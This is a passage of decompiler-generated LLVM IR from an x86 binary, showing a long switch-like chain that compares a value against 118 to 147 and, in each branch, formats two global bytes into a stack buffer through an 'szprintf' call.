  %v0_804b5ba = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b5ba = zext i8 %v0_804b5ba to i32
  store i32 %v1_804b5ba, i32* @edx, align 4
  %v0_804b5c4 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b5c4 = zext i8 %v0_804b5c4 to i32
  %v2_804b5d3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b5d3, i32* @ebx, align 4
  %v4_804b5e5 = call i32 @szprintf(i32 %v2_804b5d3, i32 ptrtoint ([14 x i8]* @global_var_805985c.144 to i32), i32 %v1_804b5c4)
  br label %dec_label_pc_804b5ea

dec_label_pc_804b5ea:                             ; preds = %dec_label_pc_804b5b4, %dec_label_pc_804b5ba
  %v13_804b5ea = icmp eq i32 %v2_8049ce5, 118
  %v1_804b5ee = icmp eq i1 %v13_804b5ea, false
  br i1 %v1_804b5ee, label %dec_label_pc_804b620, label %dec_label_pc_804b5f0

dec_label_pc_804b5f0:                             ; preds = %dec_label_pc_804b5ea
  %v0_804b5f0 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b5f0 = zext i8 %v0_804b5f0 to i32
  store i32 %v1_804b5f0, i32* @edx, align 4
  %v0_804b5fa = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b5fa = zext i8 %v0_804b5fa to i32
  %v2_804b609 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b609, i32* @ebx, align 4
  %v4_804b61b = call i32 @szprintf(i32 %v2_804b609, i32 ptrtoint ([14 x i8]* @global_var_805986a.145 to i32), i32 %v1_804b5fa)
  br label %dec_label_pc_804b620

dec_label_pc_804b620:                             ; preds = %dec_label_pc_804b5ea, %dec_label_pc_804b5f0
  %v13_804b620 = icmp eq i32 %v2_8049ce5, 119
  %v1_804b624 = icmp eq i1 %v13_804b620, false
  br i1 %v1_804b624, label %dec_label_pc_804b656, label %dec_label_pc_804b626

dec_label_pc_804b626:                             ; preds = %dec_label_pc_804b620
  %v0_804b626 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b626 = zext i8 %v0_804b626 to i32
  store i32 %v1_804b626, i32* @edx, align 4
  %v0_804b630 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b630 = zext i8 %v0_804b630 to i32
  %v2_804b63f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b63f, i32* @ebx, align 4
  %v4_804b651 = call i32 @szprintf(i32 %v2_804b63f, i32 ptrtoint ([14 x i8]* @global_var_8059878.146 to i32), i32 %v1_804b630)
  br label %dec_label_pc_804b656

dec_label_pc_804b656:                             ; preds = %dec_label_pc_804b620, %dec_label_pc_804b626
  %v13_804b656 = icmp eq i32 %v2_8049ce5, 120
  %v1_804b65a = icmp eq i1 %v13_804b656, false
  br i1 %v1_804b65a, label %dec_label_pc_804b68c, label %dec_label_pc_804b65c

dec_label_pc_804b65c:                             ; preds = %dec_label_pc_804b656
  %v0_804b65c = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b65c = zext i8 %v0_804b65c to i32
  store i32 %v1_804b65c, i32* @edx, align 4
  %v0_804b666 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b666 = zext i8 %v0_804b666 to i32
  %v2_804b675 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b675, i32* @ebx, align 4
  %v4_804b687 = call i32 @szprintf(i32 %v2_804b675, i32 ptrtoint ([14 x i8]* @global_var_8059886.147 to i32), i32 %v1_804b666)
  br label %dec_label_pc_804b68c

dec_label_pc_804b68c:                             ; preds = %dec_label_pc_804b656, %dec_label_pc_804b65c
  %v13_804b68c = icmp eq i32 %v2_8049ce5, 121
  %v1_804b690 = icmp eq i1 %v13_804b68c, false
  br i1 %v1_804b690, label %dec_label_pc_804b6c2, label %dec_label_pc_804b692

dec_label_pc_804b692:                             ; preds = %dec_label_pc_804b68c
  %v0_804b692 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b692 = zext i8 %v0_804b692 to i32
  store i32 %v1_804b692, i32* @edx, align 4
  %v0_804b69c = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b69c = zext i8 %v0_804b69c to i32
  %v2_804b6ab = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b6ab, i32* @ebx, align 4
  %v4_804b6bd = call i32 @szprintf(i32 %v2_804b6ab, i32 ptrtoint ([14 x i8]* @global_var_80597e2.135 to i32), i32 %v1_804b69c)
  br label %dec_label_pc_804b6c2

dec_label_pc_804b6c2:                             ; preds = %dec_label_pc_804b68c, %dec_label_pc_804b692
  %v13_804b6c2 = icmp eq i32 %v2_8049ce5, 122
  %v1_804b6c6 = icmp eq i1 %v13_804b6c2, false
  br i1 %v1_804b6c6, label %dec_label_pc_804b6f8, label %dec_label_pc_804b6c8

dec_label_pc_804b6c8:                             ; preds = %dec_label_pc_804b6c2
  %v0_804b6c8 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b6c8 = zext i8 %v0_804b6c8 to i32
  store i32 %v1_804b6c8, i32* @edx, align 4
  %v0_804b6d2 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b6d2 = zext i8 %v0_804b6d2 to i32
  %v2_804b6e1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b6e1, i32* @ebx, align 4
  %v4_804b6f3 = call i32 @szprintf(i32 %v2_804b6e1, i32 ptrtoint ([13 x i8]* @global_var_8059894.148 to i32), i32 %v1_804b6d2)
  br label %dec_label_pc_804b6f8

dec_label_pc_804b6f8:                             ; preds = %dec_label_pc_804b6c2, %dec_label_pc_804b6c8
  %v13_804b6f8 = icmp eq i32 %v2_8049ce5, 123
  %v1_804b6fc = icmp eq i1 %v13_804b6f8, false
  br i1 %v1_804b6fc, label %dec_label_pc_804b72e, label %dec_label_pc_804b6fe

dec_label_pc_804b6fe:                             ; preds = %dec_label_pc_804b6f8
  %v0_804b6fe = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b6fe = zext i8 %v0_804b6fe to i32
  store i32 %v1_804b6fe, i32* @edx, align 4
  %v0_804b708 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b708 = zext i8 %v0_804b708 to i32
  %v2_804b717 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b717, i32* @ebx, align 4
  %v4_804b729 = call i32 @szprintf(i32 %v2_804b717, i32 ptrtoint ([12 x i8]* @global_var_80598a1.149 to i32), i32 %v1_804b708)
  br label %dec_label_pc_804b72e

dec_label_pc_804b72e:                             ; preds = %dec_label_pc_804b6f8, %dec_label_pc_804b6fe
  %v13_804b72e = icmp eq i32 %v2_8049ce5, 124
  %v1_804b732 = icmp eq i1 %v13_804b72e, false
  br i1 %v1_804b732, label %dec_label_pc_804b764, label %dec_label_pc_804b734

dec_label_pc_804b734:                             ; preds = %dec_label_pc_804b72e
  %v0_804b734 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b734 = zext i8 %v0_804b734 to i32
  store i32 %v1_804b734, i32* @edx, align 4
  %v0_804b73e = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b73e = zext i8 %v0_804b73e to i32
  %v2_804b74d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b74d, i32* @ebx, align 4
  %v4_804b75f = call i32 @szprintf(i32 %v2_804b74d, i32 ptrtoint ([14 x i8]* @global_var_80598ad.150 to i32), i32 %v1_804b73e)
  br label %dec_label_pc_804b764

dec_label_pc_804b764:                             ; preds = %dec_label_pc_804b72e, %dec_label_pc_804b734
  %v13_804b764 = icmp eq i32 %v2_8049ce5, 125
  %v1_804b768 = icmp eq i1 %v13_804b764, false
  br i1 %v1_804b768, label %dec_label_pc_804b79a, label %dec_label_pc_804b76a

dec_label_pc_804b76a:                             ; preds = %dec_label_pc_804b764
  %v0_804b76a = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b76a = zext i8 %v0_804b76a to i32
  store i32 %v1_804b76a, i32* @edx, align 4
  %v0_804b774 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b774 = zext i8 %v0_804b774 to i32
  %v2_804b783 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b783, i32* @ebx, align 4
  %v4_804b795 = call i32 @szprintf(i32 %v2_804b783, i32 ptrtoint ([14 x i8]* @global_var_80598bb.151 to i32), i32 %v1_804b774)
  br label %dec_label_pc_804b79a

dec_label_pc_804b79a:                             ; preds = %dec_label_pc_804b764, %dec_label_pc_804b76a
  %v13_804b79a = icmp eq i32 %v2_8049ce5, 126
  %v1_804b79e = icmp eq i1 %v13_804b79a, false
  br i1 %v1_804b79e, label %dec_label_pc_804b7d0, label %dec_label_pc_804b7a0

dec_label_pc_804b7a0:                             ; preds = %dec_label_pc_804b79a
  %v0_804b7a0 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b7a0 = zext i8 %v0_804b7a0 to i32
  store i32 %v1_804b7a0, i32* @edx, align 4
  %v0_804b7aa = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b7aa = zext i8 %v0_804b7aa to i32
  %v2_804b7b9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b7b9, i32* @ebx, align 4
  %v4_804b7cb = call i32 @szprintf(i32 %v2_804b7b9, i32 ptrtoint ([14 x i8]* @global_var_80598ad.150 to i32), i32 %v1_804b7aa)
  br label %dec_label_pc_804b7d0

dec_label_pc_804b7d0:                             ; preds = %dec_label_pc_804b79a, %dec_label_pc_804b7a0
  %v13_804b7d0 = icmp eq i32 %v2_8049ce5, 127
  %v1_804b7d4 = icmp eq i1 %v13_804b7d0, false
  br i1 %v1_804b7d4, label %dec_label_pc_804b806, label %dec_label_pc_804b7d6

dec_label_pc_804b7d6:                             ; preds = %dec_label_pc_804b7d0
  %v0_804b7d6 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b7d6 = zext i8 %v0_804b7d6 to i32
  store i32 %v1_804b7d6, i32* @edx, align 4
  %v0_804b7e0 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b7e0 = zext i8 %v0_804b7e0 to i32
  %v2_804b7ef = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b7ef, i32* @ebx, align 4
  %v4_804b801 = call i32 @szprintf(i32 %v2_804b7ef, i32 ptrtoint ([14 x i8]* @global_var_80598c9.152 to i32), i32 %v1_804b7e0)
  br label %dec_label_pc_804b806

dec_label_pc_804b806:                             ; preds = %dec_label_pc_804b7d0, %dec_label_pc_804b7d6
  %v10_804b806 = icmp eq i32 %v2_8049ce5, 128
  %v1_804b80d = icmp eq i1 %v10_804b806, false
  br i1 %v1_804b80d, label %dec_label_pc_804b83f, label %dec_label_pc_804b80f

dec_label_pc_804b80f:                             ; preds = %dec_label_pc_804b806
  %v0_804b80f = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b80f = zext i8 %v0_804b80f to i32
  store i32 %v1_804b80f, i32* @edx, align 4
  %v0_804b819 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b819 = zext i8 %v0_804b819 to i32
  %v2_804b828 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b828, i32* @ebx, align 4
  %v4_804b83a = call i32 @szprintf(i32 %v2_804b828, i32 ptrtoint ([14 x i8]* @global_var_80598d7.153 to i32), i32 %v1_804b819)
  br label %dec_label_pc_804b83f

dec_label_pc_804b83f:                             ; preds = %dec_label_pc_804b806, %dec_label_pc_804b80f
  %v13_804b83f = icmp eq i32 %v2_8049ce5, 129
  %v1_804b846 = icmp eq i1 %v13_804b83f, false
  br i1 %v1_804b846, label %dec_label_pc_804b878, label %dec_label_pc_804b848

dec_label_pc_804b848:                             ; preds = %dec_label_pc_804b83f
  %v0_804b848 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b848 = zext i8 %v0_804b848 to i32
  store i32 %v1_804b848, i32* @edx, align 4
  %v0_804b852 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b852 = zext i8 %v0_804b852 to i32
  %v2_804b861 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b861, i32* @ebx, align 4
  %v4_804b873 = call i32 @szprintf(i32 %v2_804b861, i32 ptrtoint ([14 x i8]* @global_var_80598e5.154 to i32), i32 %v1_804b852)
  br label %dec_label_pc_804b878

dec_label_pc_804b878:                             ; preds = %dec_label_pc_804b83f, %dec_label_pc_804b848
  %v13_804b878 = icmp eq i32 %v2_8049ce5, 130
  %v1_804b87f = icmp eq i1 %v13_804b878, false
  br i1 %v1_804b87f, label %dec_label_pc_804b8b1, label %dec_label_pc_804b881

dec_label_pc_804b881:                             ; preds = %dec_label_pc_804b878
  %v0_804b881 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b881 = zext i8 %v0_804b881 to i32
  store i32 %v1_804b881, i32* @edx, align 4
  %v0_804b88b = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b88b = zext i8 %v0_804b88b to i32
  %v2_804b89a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b89a, i32* @ebx, align 4
  %v4_804b8ac = call i32 @szprintf(i32 %v2_804b89a, i32 ptrtoint ([14 x i8]* @global_var_80598f3.155 to i32), i32 %v1_804b88b)
  br label %dec_label_pc_804b8b1

dec_label_pc_804b8b1:                             ; preds = %dec_label_pc_804b878, %dec_label_pc_804b881
  %v13_804b8b1 = icmp eq i32 %v2_8049ce5, 131
  %v1_804b8b8 = icmp eq i1 %v13_804b8b1, false
  br i1 %v1_804b8b8, label %dec_label_pc_804b8ea, label %dec_label_pc_804b8ba

dec_label_pc_804b8ba:                             ; preds = %dec_label_pc_804b8b1
  %v0_804b8ba = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b8ba = zext i8 %v0_804b8ba to i32
  store i32 %v1_804b8ba, i32* @edx, align 4
  %v0_804b8c4 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b8c4 = zext i8 %v0_804b8c4 to i32
  %v2_804b8d3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b8d3, i32* @ebx, align 4
  %v4_804b8e5 = call i32 @szprintf(i32 %v2_804b8d3, i32 ptrtoint ([14 x i8]* @global_var_8059901.156 to i32), i32 %v1_804b8c4)
  br label %dec_label_pc_804b8ea

dec_label_pc_804b8ea:                             ; preds = %dec_label_pc_804b8b1, %dec_label_pc_804b8ba
  %v13_804b8ea = icmp eq i32 %v2_8049ce5, 132
  %v1_804b8f1 = icmp eq i1 %v13_804b8ea, false
  br i1 %v1_804b8f1, label %dec_label_pc_804b923, label %dec_label_pc_804b8f3

dec_label_pc_804b8f3:                             ; preds = %dec_label_pc_804b8ea
  %v0_804b8f3 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b8f3 = zext i8 %v0_804b8f3 to i32
  store i32 %v1_804b8f3, i32* @edx, align 4
  %v0_804b8fd = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b8fd = zext i8 %v0_804b8fd to i32
  %v2_804b90c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b90c, i32* @ebx, align 4
  %v4_804b91e = call i32 @szprintf(i32 %v2_804b90c, i32 ptrtoint ([14 x i8]* @global_var_805990f.157 to i32), i32 %v1_804b8fd)
  br label %dec_label_pc_804b923

dec_label_pc_804b923:                             ; preds = %dec_label_pc_804b8ea, %dec_label_pc_804b8f3
  %v13_804b923 = icmp eq i32 %v2_8049ce5, 133
  %v1_804b92a = icmp eq i1 %v13_804b923, false
  br i1 %v1_804b92a, label %dec_label_pc_804b95c, label %dec_label_pc_804b92c

dec_label_pc_804b92c:                             ; preds = %dec_label_pc_804b923
  %v0_804b92c = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b92c = zext i8 %v0_804b92c to i32
  store i32 %v1_804b92c, i32* @edx, align 4
  %v0_804b936 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b936 = zext i8 %v0_804b936 to i32
  %v2_804b945 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b945, i32* @ebx, align 4
  %v4_804b957 = call i32 @szprintf(i32 %v2_804b945, i32 ptrtoint ([14 x i8]* @global_var_805991d.158 to i32), i32 %v1_804b936)
  br label %dec_label_pc_804b95c

dec_label_pc_804b95c:                             ; preds = %dec_label_pc_804b923, %dec_label_pc_804b92c
  %v13_804b95c = icmp eq i32 %v2_8049ce5, 134
  %v1_804b963 = icmp eq i1 %v13_804b95c, false
  br i1 %v1_804b963, label %dec_label_pc_804b995, label %dec_label_pc_804b965

dec_label_pc_804b965:                             ; preds = %dec_label_pc_804b95c
  %v0_804b965 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b965 = zext i8 %v0_804b965 to i32
  store i32 %v1_804b965, i32* @edx, align 4
  %v0_804b96f = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b96f = zext i8 %v0_804b96f to i32
  %v2_804b97e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b97e, i32* @ebx, align 4
  %v4_804b990 = call i32 @szprintf(i32 %v2_804b97e, i32 ptrtoint ([14 x i8]* @global_var_805992b.159 to i32), i32 %v1_804b96f)
  br label %dec_label_pc_804b995

dec_label_pc_804b995:                             ; preds = %dec_label_pc_804b95c, %dec_label_pc_804b965
  %v13_804b995 = icmp eq i32 %v2_8049ce5, 135
  %v1_804b99c = icmp eq i1 %v13_804b995, false
  br i1 %v1_804b99c, label %dec_label_pc_804b9ce, label %dec_label_pc_804b99e

dec_label_pc_804b99e:                             ; preds = %dec_label_pc_804b995
  %v0_804b99e = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b99e = zext i8 %v0_804b99e to i32
  store i32 %v1_804b99e, i32* @edx, align 4
  %v0_804b9a8 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b9a8 = zext i8 %v0_804b9a8 to i32
  %v2_804b9b7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b9b7, i32* @ebx, align 4
  %v4_804b9c9 = call i32 @szprintf(i32 %v2_804b9b7, i32 ptrtoint ([14 x i8]* @global_var_8059939.160 to i32), i32 %v1_804b9a8)
  br label %dec_label_pc_804b9ce

dec_label_pc_804b9ce:                             ; preds = %dec_label_pc_804b995, %dec_label_pc_804b99e
  %v13_804b9ce = icmp eq i32 %v2_8049ce5, 136
  %v1_804b9d5 = icmp eq i1 %v13_804b9ce, false
  br i1 %v1_804b9d5, label %dec_label_pc_804ba07, label %dec_label_pc_804b9d7

dec_label_pc_804b9d7:                             ; preds = %dec_label_pc_804b9ce
  %v0_804b9d7 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804b9d7 = zext i8 %v0_804b9d7 to i32
  store i32 %v1_804b9d7, i32* @edx, align 4
  %v0_804b9e1 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804b9e1 = zext i8 %v0_804b9e1 to i32
  %v2_804b9f0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b9f0, i32* @ebx, align 4
  %v4_804ba02 = call i32 @szprintf(i32 %v2_804b9f0, i32 ptrtoint ([14 x i8]* @global_var_8059947.161 to i32), i32 %v1_804b9e1)
  br label %dec_label_pc_804ba07

dec_label_pc_804ba07:                             ; preds = %dec_label_pc_804b9ce, %dec_label_pc_804b9d7
  %v13_804ba07 = icmp eq i32 %v2_8049ce5, 137
  %v1_804ba0e = icmp eq i1 %v13_804ba07, false
  br i1 %v1_804ba0e, label %dec_label_pc_804ba40, label %dec_label_pc_804ba10

dec_label_pc_804ba10:                             ; preds = %dec_label_pc_804ba07
  %v0_804ba10 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804ba10 = zext i8 %v0_804ba10 to i32
  store i32 %v1_804ba10, i32* @edx, align 4
  %v0_804ba1a = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804ba1a = zext i8 %v0_804ba1a to i32
  %v2_804ba29 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba29, i32* @ebx, align 4
  %v4_804ba3b = call i32 @szprintf(i32 %v2_804ba29, i32 ptrtoint ([13 x i8]* @global_var_8059955.162 to i32), i32 %v1_804ba1a)
  br label %dec_label_pc_804ba40

dec_label_pc_804ba40:                             ; preds = %dec_label_pc_804ba07, %dec_label_pc_804ba10
  %v13_804ba40 = icmp eq i32 %v2_8049ce5, 138
  %v1_804ba47 = icmp eq i1 %v13_804ba40, false
  br i1 %v1_804ba47, label %dec_label_pc_804ba79, label %dec_label_pc_804ba49

dec_label_pc_804ba49:                             ; preds = %dec_label_pc_804ba40
  %v0_804ba49 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804ba49 = zext i8 %v0_804ba49 to i32
  store i32 %v1_804ba49, i32* @edx, align 4
  %v0_804ba53 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804ba53 = zext i8 %v0_804ba53 to i32
  %v2_804ba62 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba62, i32* @ebx, align 4
  %v4_804ba74 = call i32 @szprintf(i32 %v2_804ba62, i32 ptrtoint ([13 x i8]* @global_var_8059962.163 to i32), i32 %v1_804ba53)
  br label %dec_label_pc_804ba79

dec_label_pc_804ba79:                             ; preds = %dec_label_pc_804ba40, %dec_label_pc_804ba49
  %v13_804ba79 = icmp eq i32 %v2_8049ce5, 139
  %v1_804ba80 = icmp eq i1 %v13_804ba79, false
  br i1 %v1_804ba80, label %dec_label_pc_804bab2, label %dec_label_pc_804ba82

dec_label_pc_804ba82:                             ; preds = %dec_label_pc_804ba79
  %v0_804ba82 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804ba82 = zext i8 %v0_804ba82 to i32
  store i32 %v1_804ba82, i32* @edx, align 4
  %v0_804ba8c = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804ba8c = zext i8 %v0_804ba8c to i32
  %v2_804ba9b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ba9b, i32* @ebx, align 4
  %v4_804baad = call i32 @szprintf(i32 %v2_804ba9b, i32 ptrtoint ([13 x i8]* @global_var_805996f.164 to i32), i32 %v1_804ba8c)
  br label %dec_label_pc_804bab2

dec_label_pc_804bab2:                             ; preds = %dec_label_pc_804ba79, %dec_label_pc_804ba82
  %v13_804bab2 = icmp eq i32 %v2_8049ce5, 140
  %v1_804bab9 = icmp eq i1 %v13_804bab2, false
  br i1 %v1_804bab9, label %dec_label_pc_804baeb, label %dec_label_pc_804babb

dec_label_pc_804babb:                             ; preds = %dec_label_pc_804bab2
  %v0_804babb = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804babb = zext i8 %v0_804babb to i32
  store i32 %v1_804babb, i32* @edx, align 4
  %v0_804bac5 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804bac5 = zext i8 %v0_804bac5 to i32
  %v2_804bad4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bad4, i32* @ebx, align 4
  %v4_804bae6 = call i32 @szprintf(i32 %v2_804bad4, i32 ptrtoint ([13 x i8]* @global_var_805997c.165 to i32), i32 %v1_804bac5)
  br label %dec_label_pc_804baeb

dec_label_pc_804baeb:                             ; preds = %dec_label_pc_804bab2, %dec_label_pc_804babb
  %v13_804baeb = icmp eq i32 %v2_8049ce5, 141
  %v1_804baf2 = icmp eq i1 %v13_804baeb, false
  br i1 %v1_804baf2, label %dec_label_pc_804bb24, label %dec_label_pc_804baf4

dec_label_pc_804baf4:                             ; preds = %dec_label_pc_804baeb
  %v0_804baf4 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804baf4 = zext i8 %v0_804baf4 to i32
  store i32 %v1_804baf4, i32* @edx, align 4
  %v0_804bafe = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804bafe = zext i8 %v0_804bafe to i32
  %v2_804bb0d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb0d, i32* @ebx, align 4
  %v4_804bb1f = call i32 @szprintf(i32 %v2_804bb0d, i32 ptrtoint ([13 x i8]* @global_var_8059989.166 to i32), i32 %v1_804bafe)
  br label %dec_label_pc_804bb24

dec_label_pc_804bb24:                             ; preds = %dec_label_pc_804baeb, %dec_label_pc_804baf4
  %v13_804bb24 = icmp eq i32 %v2_8049ce5, 142
  %v1_804bb2b = icmp eq i1 %v13_804bb24, false
  br i1 %v1_804bb2b, label %dec_label_pc_804bb5d, label %dec_label_pc_804bb2d

dec_label_pc_804bb2d:                             ; preds = %dec_label_pc_804bb24
  %v0_804bb2d = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804bb2d = zext i8 %v0_804bb2d to i32
  store i32 %v1_804bb2d, i32* @edx, align 4
  %v0_804bb37 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804bb37 = zext i8 %v0_804bb37 to i32
  %v2_804bb46 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb46, i32* @ebx, align 4
  %v4_804bb58 = call i32 @szprintf(i32 %v2_804bb46, i32 ptrtoint ([13 x i8]* @global_var_8059996.167 to i32), i32 %v1_804bb37)
  br label %dec_label_pc_804bb5d

dec_label_pc_804bb5d:                             ; preds = %dec_label_pc_804bb24, %dec_label_pc_804bb2d
  %v13_804bb5d = icmp eq i32 %v2_8049ce5, 143
  %v1_804bb64 = icmp eq i1 %v13_804bb5d, false
  br i1 %v1_804bb64, label %dec_label_pc_804bb96, label %dec_label_pc_804bb66

dec_label_pc_804bb66:                             ; preds = %dec_label_pc_804bb5d
  %v0_804bb66 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804bb66 = zext i8 %v0_804bb66 to i32
  store i32 %v1_804bb66, i32* @edx, align 4
  %v0_804bb70 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804bb70 = zext i8 %v0_804bb70 to i32
  %v2_804bb7f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb7f, i32* @ebx, align 4
  %v4_804bb91 = call i32 @szprintf(i32 %v2_804bb7f, i32 ptrtoint ([14 x i8]* @global_var_80598ad.150 to i32), i32 %v1_804bb70)
  br label %dec_label_pc_804bb96

dec_label_pc_804bb96:                             ; preds = %dec_label_pc_804bb5d, %dec_label_pc_804bb66
  %v10_804bb96 = icmp eq i32 %v2_8049ce5, 144
  %v1_804bb9d = icmp eq i1 %v10_804bb96, false
  br i1 %v1_804bb9d, label %dec_label_pc_804bbcf, label %dec_label_pc_804bb9f

dec_label_pc_804bb9f:                             ; preds = %dec_label_pc_804bb96
  %v0_804bb9f = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804bb9f = zext i8 %v0_804bb9f to i32
  store i32 %v1_804bb9f, i32* @edx, align 4
  %v0_804bba9 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804bba9 = zext i8 %v0_804bba9 to i32
  %v2_804bbb8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bbb8, i32* @ebx, align 4
  %v4_804bbca = call i32 @szprintf(i32 %v2_804bbb8, i32 ptrtoint ([14 x i8]* @global_var_80599a3.168 to i32), i32 %v1_804bba9)
  br label %dec_label_pc_804bbcf

dec_label_pc_804bbcf:                             ; preds = %dec_label_pc_804bb96, %dec_label_pc_804bb9f
  %v13_804bbcf = icmp eq i32 %v2_8049ce5, 145
  %v1_804bbd6 = icmp eq i1 %v13_804bbcf, false
  br i1 %v1_804bbd6, label %dec_label_pc_804bc08, label %dec_label_pc_804bbd8

dec_label_pc_804bbd8:                             ; preds = %dec_label_pc_804bbcf
  %v0_804bbd8 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804bbd8 = zext i8 %v0_804bbd8 to i32
  store i32 %v1_804bbd8, i32* @edx, align 4
  %v0_804bbe2 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804bbe2 = zext i8 %v0_804bbe2 to i32
  %v2_804bbf1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bbf1, i32* @ebx, align 4
  %v4_804bc03 = call i32 @szprintf(i32 %v2_804bbf1, i32 ptrtoint ([14 x i8]* @global_var_80599b1.169 to i32), i32 %v1_804bbe2)
  br label %dec_label_pc_804bc08

dec_label_pc_804bc08:                             ; preds = %dec_label_pc_804bbcf, %dec_label_pc_804bbd8
  %v13_804bc08 = icmp eq i32 %v2_8049ce5, 146
  %v1_804bc0f = icmp eq i1 %v13_804bc08, false
  br i1 %v1_804bc0f, label %dec_label_pc_804bc41, label %dec_label_pc_804bc11

dec_label_pc_804bc11:                             ; preds = %dec_label_pc_804bc08
  %v0_804bc11 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804bc11 = zext i8 %v0_804bc11 to i32
  store i32 %v1_804bc11, i32* @edx, align 4
  %v0_804bc1b = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804bc1b = zext i8 %v0_804bc1b to i32
  %v2_804bc2a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc2a, i32* @ebx, align 4
  %v4_804bc3c = call i32 @szprintf(i32 %v2_804bc2a, i32 ptrtoint ([14 x i8]* @global_var_80599bf.170 to i32), i32 %v1_804bc1b)
  br label %dec_label_pc_804bc41

dec_label_pc_804bc41:                             ; preds = %dec_label_pc_804bc08, %dec_label_pc_804bc11
  %v13_804bc41 = icmp eq i32 %v2_8049ce5, 147
  %v1_804bc48 = icmp eq i1 %v13_804bc41, false
  br i1 %v1_804bc48, label %dec_label_pc_804bc7a, label %dec_label_pc_804bc4a

dec_label_pc_804bc4a:                             ; preds = %dec_label_pc_804bc41
  %v0_804bc4a = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804bc4a = zext i8 %v0_804bc4a to i32
  store i32 %v1_804bc4a, i32* @edx, align 4
